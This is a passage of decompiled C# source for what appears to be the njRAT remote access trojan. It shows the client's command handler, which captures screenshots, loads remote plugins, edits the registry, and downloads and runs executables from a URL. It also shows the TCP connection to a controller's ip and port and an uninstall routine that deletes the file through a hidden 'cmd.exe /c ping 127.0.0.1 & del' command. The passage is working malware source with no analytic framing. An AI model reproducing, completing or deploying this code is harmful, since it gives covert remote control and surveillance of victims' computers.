                                                        }, null, null);
                                                    }
                                                    else
                                                    {
                                                        if (Operators.CompareString(left, "ret", false) == 0)
                                                        {
                                                            Send("bla");
                                                            string text11 = GRegValue(array[1]);
                                                            byte[] array5;
                                                            if (text11.Length > 0)
                                                            {
                                                                array5 = Convert.FromBase64String(text11);
                                                                Send(string.Concat(new[]
                                                                {
                                                                    "pl",
                                                                    split,
                                                                    array[1],
                                                                    split,
                                                                    Conversions.ToString(0)
                                                                }));
                                                            }
                                                            else
                                                            {
                                                                if (array[2].Length == 1)
                                                                {
                                                                    Send(string.Concat(new[]
                                                                    {
                                                                        "pl",
                                                                        split,
                                                                        array[1],
                                                                        split,
                                                                        "True"
                                                                    }));
                                                                    return;
                                                                }
                                                                byte[] arg_FEB_0 = Convert.FromBase64String(array[2]);
                                                                bool flag = false;
                                                                array5 = ZIP(arg_FEB_0, ref flag);
                                                                if (
                                                                    Conversions.ToBoolean(SRegValue(array[1],
                                                                        Convert.ToBase64String(array5))))
                                                                {
                                                                    Send(string.Concat(new[]
                                                                    {
                                                                        "pl",
                                                                        split,
                                                                        array[1],
                                                                        split,
                                                                        Conversions.ToString(0)
                                                                    }));
                                                                }
                                                            }
                                                            object objectValue2 =
                                                                RuntimeHelpers.GetObjectValue(Plugin(array5, "A"));
                                                            var array3 = new string[5];
                                                            array3[0] = "ret";
                                                            array3[1] = split;
                                                            array3[2] = array[1];
                                                            array3[3] = split;
                                                            string[] arg_10AD_0 = array3;
                                                            int arg_10AD_1 = 4;
                                                            string text8 =
                                                                Conversions.ToString(NewLateBinding.LateGet(
                                                                    objectValue2, null, "GT", new object[0], null, null,
                                                                    null));
                                                            arg_10AD_0[arg_10AD_1] = ToBase64(ref text8);
                                                            Send(string.Concat(array3));
                                                        }
                                                        else
                                                        {
                                                            if (Operators.CompareString(left, "CAP", false) == 0)
                                                            {
                                                                int arg_10F9_0 = Screen.PrimaryScreen.Bounds.Width;
                                                                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                                                                var bitmap = new Bitmap(arg_10F9_0, bounds.Height);
                                                                Graphics graphics = Graphics.FromImage(bitmap);
                                                                Graphics arg_112B_0 = graphics;
                                                                int arg_112B_1 = 0;
                                                                int arg_112B_2 = 0;
                                                                int arg_112B_3 = 0;
                                                                int arg_112B_4 = 0;
                                                                var size = new Size(bitmap.Width, bitmap.Height);
                                                                arg_112B_0.CopyFromScreen(arg_112B_1, arg_112B_2,
                                                                    arg_112B_3, arg_112B_4, size,
                                                                    CopyPixelOperation.SourceCopy);
                                                                try
                                                                {
                                                                    Cursor arg_1152_0 = Cursors.Default;
                                                                    Graphics arg_1152_1 = graphics;
                                                                    Point arg_114B_1 = Cursor.Position;
                                                                    size = new Size(32, 32);
                                                                    bounds = new Rectangle(arg_114B_1, size);
                                                                    arg_1152_0.Draw(arg_1152_1, bounds);
                                                                }
                                                                catch (Exception expr_1159)
                                                                {
                                                                    ProjectData.SetProjectError(expr_1159);
                                                                    ProjectData.ClearProjectError();
                                                                }
                                                                graphics.Dispose();
                                                                var memoryStream = new MemoryStream();
                                                                string text8 = "CAP" + split;
                                                                b = GetBytes( text8);
                                                                memoryStream.Write(b, 0, b.Length);
                                                                var memoryStream2 = new MemoryStream();
                                                                var callbackData = (IntPtr) 0;
                                                                bitmap.GetThumbnailImage(
                                                                    Conversions.ToInteger(array[1]),
                                                                    Conversions.ToInteger(array[2]), null, callbackData)
                                                                    .Save(memoryStream2, ImageFormat.Jpeg);
                                                                string mD5Hash = getMD5Hash(memoryStream2.ToArray());
                                                                if (Operators.CompareString(mD5Hash, lastcap, false) !=
                                                                    0)
                                                                {
                                                                    lastcap = mD5Hash;
                                                                    memoryStream.Write(memoryStream2.ToArray(), 0,
                                                                        (int) memoryStream2.Length);
                                                                }
                                                                else
                                                                {
                                                                    memoryStream.WriteByte(0);
                                                                }
                                                                Sendbytes(memoryStream.ToArray());
                                                                memoryStream.Dispose();
                                                                memoryStream2.Dispose();
                                                                bitmap.Dispose();
                                                            }
                                                            else
                                                            {
                                                                if (Operators.CompareString(left, "P", false) == 0)
                                                                {
                                                                    Send("P");
                                                                }
                                                                else
                                                                {
                                                                    if (Operators.CompareString(left, "un", false) == 0)
                                                                    {
                                                                        string left4 = array[1];
                                                                        if (
                                                                            Operators.CompareString(left4, "~", false) ==
                                                                            0)
                                                                        {
                                                                            Uninstall();
                                                                        }
                                                                        else
                                                                        {
                                                                            if (
                                                                                Operators.CompareString(left4, "!",
                                                                                    false) == 0)
                                                                            {
                                                                                pr(0);
                                                                                ProjectData.EndApp();
                                                                            }
                                                                            else
                                                                            {
                                                                                if (
                                                                                    Operators.CompareString(left4, "@",
                                                                                        false) == 0)
                                                                                {
                                                                                    pr(0);
                                                                                    Process.Start(AppFileInfo.FullName);
                                                                                    ProjectData.EndApp();
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                    else
                                                                    {
                                                                        if (
                                                                            Operators.CompareString(left, "up", false) ==
                                                                            0)
                                                                        {
                                                                            byte[] bytes2 = null;
                                                                            if (!array[1].ToLower().StartsWith("http"))
                                                                            {
                                                                                try
                                                                                {
                                                                                    byte[] arg_130E_0 =
                                                                                        Convert.FromBase64String(
                                                                                            array[1]);
                                                                                    bool flag = false;
                                                                                    bytes2 = ZIP(arg_130E_0, ref flag);
                                                                                    goto IL_139B;
                                                                                }
                                                                                catch (Exception expr_131A)
                                                                                {
                                                                                    ProjectData.SetProjectError(
                                                                                        expr_131A);
                                                                                    Send("MSG" + split + "Update ERROR");
                                                                                    Send("bla");
                                                                                    ProjectData.ClearProjectError();
                                                                                    return;
                                                                                }
                                                                            }
                                                                            var webClient2 = new WebClient();
                                                                            try
                                                                            {
                                                                                bytes2 =
                                                                                    webClient2.DownloadData(array[1]);
                                                                            }
                                                                            catch (Exception expr_1365)
                                                                            {
                                                                                ProjectData.SetProjectError(expr_1365);
                                                                                Send("MSG" + split + "Update ERROR");
                                                                                Send("bla");
                                                                                ProjectData.ClearProjectError();
                                                                                return;
                                                                            }
                                                                            IL_139B:
                                                                            Send("bla");
                                                                            F.Registry.CurrentUser.SetValue("di", "");
                                                                            string text12 =
                                                                                Interaction.Environ("temp") + "\\" +
                                                                                RandomStr(10) + ".exe";
                                                                            File.WriteAllBytes(text12, bytes2);
                                                                            Send("MSG" + split + "Updating To " +
                                                                                 new FileInfo(text12).Name);
                                                                            Process.Start(text12,
                                                                                "UP:" +
                                                                                Conversions.ToString(
                                                                                    Process.GetCurrentProcess().Id));
                                                                            int num5 = 0;
                                                                            do
                                                                            {
                                                                                Thread.Sleep(10);
                                                                                if (
                                                                                    Operators
                                                                                        .ConditionalCompareObjectEqual(
                                                                                            F.Registry.CurrentUser
                                                                                                .GetValue("di", ""), "!",
                                                                                            false))
                                                                                {
                                                                                    Uninstall();
                                                                                }
                                                                                num5++;
                                                                            } while (num5 <= 500);
                                                                        }
                                                                        else
                                                                        {
                                                                            if (
                                                                                Operators.CompareString(left, "RG",
                                                                                    false) == 0)
                                                                            {
                                                                                RegistryKey key = GetKey(array[2]);
                                                                                string left5 = array[1];
                                                                                if (
                                                                                    Operators.CompareString(left5, "~",
                                                                                        false) == 0)
                                                                                {
                                                                                    string str = string.Concat(new[]
                                                                                    {
                                                                                        "RG",
                                                                                        split,
                                                                                        "~",
                                                                                        split,
                                                                                        array[2],
                                                                                        split
                                                                                    });
                                                                                    string text13 = "";
                                                                                    string[] subKeyNames =
                                                                                        key.GetSubKeyNames();
                                                                                    for (int m = 0;
                                                                                        m < subKeyNames.Length;
                                                                                        m++)
                                                                                    {
                                                                                        string text14 = subKeyNames[m];
                                                                                        if (!text14.Contains("\\"))
                                                                                        {
                                                                                            text13 = text13 + text14 + split;
                                                                                        }
                                                                                    }
                                                                                    string[] valueNames =
                                                                                        key.GetValueNames();
                                                                                    for (int n = 0;
                                                                                        n < valueNames.Length;
                                                                                        n++)
                                                                                    {
                                                                                        string text15 = valueNames[n];
                                                                                        text13 = string.Concat(new[]
                                                                                        {
                                                                                            text13,
                                                                                            text15,
                                                                                            "/",
                                                                                            key.GetValueKind(text15)
                                                                                                .ToString(),
                                                                                            "/",
                                                                                            key.GetValue(text15, "")
                                                                                                .ToString(),
                                                                                            split
                                                                                        });
                                                                                    }
                                                                                    Send(str + text13);
                                                                                }
                                                                                else
                                                                                {
                                                                                    if (
                                                                                        Operators.CompareString(left5,
                                                                                            "!", false) == 0)
                                                                                    {
                                                                                        key.SetValue(array[3], array[4],
                                                                                            (RegistryValueKind)
                                                                                                Conversions.ToInteger(
                                                                                                    array[5]));
                                                                                    }
                                                                                    else
                                                                                    {
                                                                                        if (
                                                                                            Operators.CompareString(
                                                                                                left5, "@", false) == 0)
                                                                                        {
                                                                                            key.DeleteValue(array[3],
                                                                                                false);
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                            if (
                                                                                                Operators.CompareString(
                                                                                                    left5, "#", false) ==
                                                                                                0)
                                                                                            {
                                                                                                key.CreateSubKey(
                                                                                                    array[3]);
                                                                                            }
                                                                                            else
                                                                                            {
                                                                                                if (
                                                                                                    Operators
                                                                                                        .CompareString(
                                                                                                            left5, "$",
                                                                                                            false) == 0)
                                                                                                {
                                                                                                    key.DeleteSubKeyTree
                                                                                                        (array[3]);
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                catch (Exception expr_1665)
                {
                    ProjectData.SetProjectError(expr_1665);
                    Exception ex4 = expr_1665;
                    try
                    {
                        Send(string.Concat(new[]
                        {
                            "ER",
                            split,
                            array[0],
                            split,
                            ex4.Message
                        }));
                    }
                    catch (Exception expr_16B1)
                    {
                        ProjectData.SetProjectError(expr_16B1);
                        ProjectData.ClearProjectError();
                    }
                    ProjectData.ClearProjectError();
                }
            }
        }

        public static string getMD5Hash(byte[] B)
        {
            var mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
            B = mD5CryptoServiceProvider.ComputeHash(B);
            string text = "";
            byte[] array = B;
            checked
            {
                for (int i = 0; i < array.Length; i++)
                {
                    byte b = array[i];
                    text += b.ToString("x2");
                }
                return text;
            }
        }

        public static RegistryKey GetKey(string key)
        {
            if (key.StartsWith(F.Registry.ClassesRoot.Name))
            {
                string name = key.Replace(F.Registry.ClassesRoot.Name + "\\", "");
                return F.Registry.ClassesRoot.OpenSubKey(name, true);
            }
            if (key.StartsWith(F.Registry.CurrentUser.Name))
            {
                string name = key.Replace(F.Registry.CurrentUser.Name + "\\", "");
                return F.Registry.CurrentUser.OpenSubKey(name, true);
            }
            if (key.StartsWith(F.Registry.LocalMachine.Name))
            {
                string name = key.Replace(F.Registry.LocalMachine.Name + "\\", "");
                return F.Registry.LocalMachine.OpenSubKey(name, true);
            }
            if (key.StartsWith(F.Registry.Users.Name))
            {
                string name = key.Replace(F.Registry.Users.Name + "\\", "");
                return F.Registry.Users.OpenSubKey(name, true);
            }
            return null;
        }

        public static void pr(int i)
        {
            try
            {
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
            }
            catch (Exception expr_17)
            {
                ProjectData.SetProjectError(expr_17);
                ProjectData.ClearProjectError();
            }
        }

        public static bool Sendbytes(byte[] b)
        {
            if (!ON)
            {
                return false;
            }
            FileInfo lO = AppFileInfo;
            Monitor.Enter(lO);
            bool result;
            try
            {
                if (ON)
                {
                    try
                    {
                        var memoryStream = new MemoryStream();
                        memoryStream.Write(b, 0, b.Length);
                        memoryStream.Write(GetBytes( endof), 0, endof.Length);
                        tcp.Client.Send(memoryStream.ToArray(), 0, checked((int) memoryStream.Length), SocketFlags.None);
                        memoryStream.Dispose();
                        result = true;
                        return result;
                    }
                    catch (Exception expr_76)
                    {
                        ProjectData.SetProjectError(expr_76);
                        try
                        {
                            if (ON)
                            {
                                tcp.Close();
                            }
                        }
                        catch (Exception expr_90)
                        {
                            ProjectData.SetProjectError(expr_90);
                            ProjectData.ClearProjectError();
                        }
                        ON = false;
                        result = false;
                        ProjectData.ClearProjectError();
                        return result;
                    }
                }
                result = false;
            }
            finally
            {
                Monitor.Exit(lO);
            }
            return result;
        }

        public static bool Send(string S)
        {
            return Sendbytes(GetBytes( S));
        }

        public static bool connect()
        {
            FileInfo lO = AppFileInfo;
            Monitor.Enter(lO);
            bool result;
            try
            {
                try
                {
                    if (tcp != null)
                    {
                        try
                        {
                            tcp.Client.Disconnect(false);
                        }
                        catch (Exception expr_27)
                        {
                            ProjectData.SetProjectError(expr_27);
                            ProjectData.ClearProjectError();
                        }
                        try
                        {
                            tcp.Close();
                            tcp = null;
                        }
                        catch (Exception expr_47)
                        {
                            ProjectData.SetProjectError(expr_47);
                            ProjectData.ClearProjectError();
                        }
                    }
                    try
                    {
                        MeM.Dispose();
                    }
                    catch (Exception expr_61)
                    {
                        ProjectData.SetProjectError(expr_61);
                        ProjectData.ClearProjectError();
                    }
                    MeM = new MemoryStream();
                    try
                    {
                        if (Pro != null)
                        {
                            Pro.Kill();
                            Pro = null;
                        }
                    }
                    catch (Exception expr_92)
                    {
                        ProjectData.SetProjectError(expr_92);
                        ProjectData.ClearProjectError();
                    }
                }
                catch (Exception expr_A0)
                {
                    ProjectData.SetProjectError(expr_A0);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    tcp = new TcpClient();
                    Thread.Sleep(1000);
                    tcp.Connect(ip, Conversions.ToInteger(port));
                    ON = true;
                    Send(Info());
                    if (!ON)
                    {
                        result = false;
                    }
                    else
                    {
                        result = true;
                    }
                }
                catch (Exception expr_FB)
                {
                    ProjectData.SetProjectError(expr_FB);
                    ON = false;
                    result = false;
                    ProjectData.ClearProjectError();
                }
            }
            finally
            {
                Monitor.Exit(lO);
            }
            return result;
        }

        public static void Listen()
        {
            checked
            {
                while (true)
                {
                    if (tcp != null)
                    {
                        try
                        {
                            while (ON)
                            {
                                if (tcp.Available > 0)
                                {
                                    Message = new byte[tcp.Client.Available - 1 + 1];
                                    int num = tcp.Client.Receive(Message, 0, Message.Length, SocketFlags.None);
                                    if (num <= 0)
                                    {
                                        break;
                                    }
                                    MeM.Write(Message, 0, num);
                                    while (true)
                                    {
                                        byte[] array = MeM.ToArray();
                                        if (!GetString( array).Contains(endof))
                                        {
                                            break;
                                        }
                                        Array array2 = fx(MeM.ToArray(), endof);
                                        var thread = new Thread(a0 => Ind((byte[]) a0));
                                        thread.Start(
                                            RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(array2,
                                                new object[]
                                                {
                                                    0
                                                }, null)));
                                        thread.Join(200);
                                        MeM.Dispose();
                                        MeM = new MemoryStream();
                                        if (array2.Length != 2)
                                        {
                                            break;
                                        }
                                        MeM.Write((byte[]) NewLateBinding.LateIndexGet(array2, new object[]
                                        {
                                            1
                                        }, null), 0,
                                            Conversions.ToInteger(
                                                NewLateBinding.LateGet(NewLateBinding.LateIndexGet(array2, new object[]
                                                {
                                                    1
                                                }, null), null, "length", new object[0], null, null, null)));
                                    }
                                }
                                else
                                {
                                    int num2 = tcp.GetStream().ReadByte();
                                    if (num2 == -1)
                                    {
                                        break;
                                    }
                                    MeM.WriteByte((byte) num2);
                                }
                                Thread.Sleep(1);
                            }
                        }
                        catch (Exception expr_1AD)
                        {
                            ProjectData.SetProjectError(expr_1AD);
                            ProjectData.ClearProjectError();
                        }
                    }
                    IL_1C9:
                    ON = false;
                    Thread.Sleep(2500);
                    if (connect())
                    {
                        ON = true;
                        continue;
                    }
                    goto IL_1C9;
                }
            }
        }

        public static void Uninstall()
        {
            pr(0);
            try
            {
                F.Registry.CurrentUser.OpenSubKey(AutoRunKey, true).DeleteValue(RG, false);
            }
            catch (Exception expr_2D)
            {
                ProjectData.SetProjectError(expr_2D);
                ProjectData.ClearProjectError();
            }
            try
            {
                F.Registry.LocalMachine.OpenSubKey(AutoRunKey, true).DeleteValue(RG, false);
            }
            catch (Exception expr_62)
            {
                ProjectData.SetProjectError(expr_62);
                ProjectData.ClearProjectError();
            }
            try
            {
                Interaction.Shell("netsh firewall delete allowedprogram \"" + AppFileInfo.FullName + "\"", AppWinStyle.Hide,
                    false, -1);
            }
            catch (Exception expr_94)
            {
                ProjectData.SetProjectError(expr_94);
                ProjectData.ClearProjectError();
            }
            try
            {
                if (FS != null)
                {
                    FS.Dispose();
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe");
                }
            }
            catch (Exception expr_D4)
            {
                ProjectData.SetProjectError(expr_D4);
                ProjectData.ClearProjectError();
            }
            try
            {
                F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(RG, false);
            }
            catch (Exception expr_109)
            {
                ProjectData.SetProjectError(expr_109);
                ProjectData.ClearProjectError();
            }
            try
            {
                Interaction.Shell("cmd.exe /c ping 127.0.0.1 & del \"" + AppFileInfo.FullName + "\"", AppWinStyle.Hide, false, -1);
            }
            catch (Exception expr_13B)
            {
                ProjectData.SetProjectError(expr_13B);
                ProjectData.ClearProjectError();
            }
            ProjectData.EndApp();
        }

        /* [DebuggerStepThrough, CompilerGenerated]
		private static void _Lambda$__1(object a0)
		{
			OK.Send(Conversions.ToString(a0));
		}
		[DebuggerStepThrough, CompilerGenerated]
		private static void _Lambda$__2(object sender, EventArgs e)
		{
			OK.ex();
		}
		[DebuggerStepThrough, CompilerGenerated]
		private static void _Lambda$__3(object a0)
		{
			OK.Ind((byte[])a0);
		} */
    }
}